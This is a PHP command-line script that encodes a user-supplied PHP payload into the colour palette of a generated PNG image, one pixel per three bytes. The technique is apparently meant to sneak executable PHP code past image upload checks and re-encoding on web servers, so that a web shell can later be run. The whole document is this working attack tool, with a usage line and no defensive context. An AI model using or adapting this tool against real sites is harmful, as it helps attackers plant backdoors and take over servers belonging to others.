<?php
    
if(count($argv) != 3) exit("Usage $argv[0] <PHP payload> <Output file>");
    
$_payload = $argv[1];
$output = $argv[2];
    
while (strlen($_payload) % 3 != 0) { $_payload.=" "; }

$_pay_len=strlen($_payload);
if ($_pay_len > 256*3){
    echo "FATAL: The payload is too long. Exiting...";
    exit();
}
if($_pay_len %3 != 0){
    echo "FATAL: The payload isn't divisible by 3. Exiting...";
    exit();
}

$width=$_pay_len/3;
$height=20;
$im = imagecreate($width, $height);
    
$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);
    
for($i=0; $i < count($_chunks); $i++){
    $_color_chunks=str_split($_chunks[$i], 2);
    $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
    
    imagesetpixel($im,$i,1,$color);
}
    
imagepng($im,$output);